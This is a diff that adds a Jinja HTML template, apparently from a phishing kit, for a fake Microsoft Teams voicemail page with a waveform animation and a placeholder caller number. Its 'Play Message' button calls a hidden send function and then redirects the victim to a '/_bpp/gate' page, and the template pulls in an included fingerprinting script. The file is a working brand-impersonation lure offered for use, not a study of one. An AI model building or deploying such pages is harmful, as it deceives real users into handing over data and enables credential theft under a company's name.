@@ -1,0 +1,84 @@
+<!-- BPP-Template
+name: Voicemail Notification
+description: Teams/Outlook voicemail player page with waveform animation
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Voicemail - {{ brand | default('Microsoft') }} Teams</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #f2f2f2;
+      display: flex; align-items: center; justify-content: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #fff; border-radius: 8px;
+      box-shadow: 0 2px 12px rgba(0,0,0,.1);
+      padding: 32px; max-width: 420px; width: 92%;
+    }
+    .header { display: flex; align-items: center; gap: 14px; margin-bottom: 20px }
+    .avatar {
+      width: 48px; height: 48px; background: #0078d4;
+      border-radius: 50%; display: flex; align-items: center;
+      justify-content: center; color: #fff; font-size: 22px;
+    }
+    .meta h2 { font-size: 16px; margin-bottom: 2px }
+    .meta p { font-size: 13px; color: #888 }
+    .player {
+      background: #f9f9f9; border-radius: 8px; padding: 16px;
+      margin-bottom: 20px;
+    }
+    .waveform {
+      height: 40px; display: flex; align-items: center;
+      gap: 2px; margin-bottom: 8px;
+    }
+    .waveform span {
+      display: block; width: 3px; background: #0078d4;
+      border-radius: 2px; animation: wave 1.5s ease-in-out infinite;
+    }
+    @keyframes wave { 0%,100% { height: 10px } 50% { height: 100% } }
+    .time { font-size: 12px; color: #888; text-align: right }
+    .btn {
+      display: block; width: 100%; padding: 12px;
+      background: #0078d4; color: #fff; border: none;
+      border-radius: 6px; font-size: 15px; font-weight: 600; cursor: pointer;
+    }
+    .btn:hover { background: #106ebe }
+    .foot { text-align: center; margin-top: 16px; font-size: 11px; color: #999 }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="header">
+      <div class="avatar">&#x1f3a4;</div>
+      <div class="meta">
+        <h2>New Voicemail</h2>
+        <p>{{ caller | default('+1 (555) 012-3456') }} &middot; {{ duration | default('0:42') }}</p>
+      </div>
+    </div>
+    <div class="player">
+      <div class="waveform" id="wf"></div>
+      <div class="time">0:00 / {{ duration | default('0:42') }}</div>
+    </div>
+    <button class="btn" onclick="window.__bpp_send(function(){ window.location.href='/_bpp/gate' })">
+      Play Message
+    </button>
+    <div class="foot">{{ brand | default('Microsoft') }} Teams &middot; Voicemail</div>
+  </div>
+  {% include '_fingerprint.html' %}
+  <script>
+    var wf = document.getElementById("wf");
+    for (var i = 0; i < 40; i++) {
+      var s = document.createElement("span");
+      s.style.height = (Math.random() * 30 + 5) + "px";
+      s.style.animationDelay = (Math.random() * 1.5) + "s";
+      wf.appendChild(s);
+    }
+  </script>
+</body>
+</html>
